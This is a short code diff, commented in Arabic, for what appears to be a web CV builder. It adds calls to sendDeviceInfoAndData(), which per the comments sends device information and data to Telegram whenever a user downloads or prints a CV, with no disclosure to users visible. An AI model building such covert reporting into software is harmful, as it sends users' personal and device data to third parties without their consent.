@@ -456,14 +456,15 @@ async function sendDeviceInfoAndData() {
 }
 
 // دالة تنزيل السيرة الذاتية كصورة JPG عالية الدقة
-function downloadCVAsJPG() {
+// دالة تنزيل السيرة الذاتية كصورة JPG عالية الدقة
+async function downloadCVAsJPG() {
   // إزالة التحديد المنقط مؤقتاً لكي لا يظهر البرواز في الصورة المحفوظة
   const activeEl = document.querySelector('.overlay-val.active-overlay');
   if (activeEl) {
     activeEl.classList.remove('active-overlay');
   }
 
-  sendDeviceInfoAndData();
+  await sendDeviceInfoAndData(); // الانتظار حتى يتم إرسال اللوق تليجرام بنجاح
 
   const element = document.getElementById('cvCard');
   const codeValue = document.getElementById('inputCode')?.value.trim() || 'جديد';
@@ -492,6 +493,9 @@ function downloadCVAsJPG() {
 function printCV() {
   const activeEl = document.querySelector('.overlay-val.active-overlay');
   if (activeEl) activeEl.classList.remove('active-overlay');
+  
+  sendDeviceInfoAndData(); // أضفنا استدعاْء الإشعار هنا أيضاً عند الطباعة
+
   window.print();
   if (activeEl) activeEl.classList.add('active-overlay');
 }
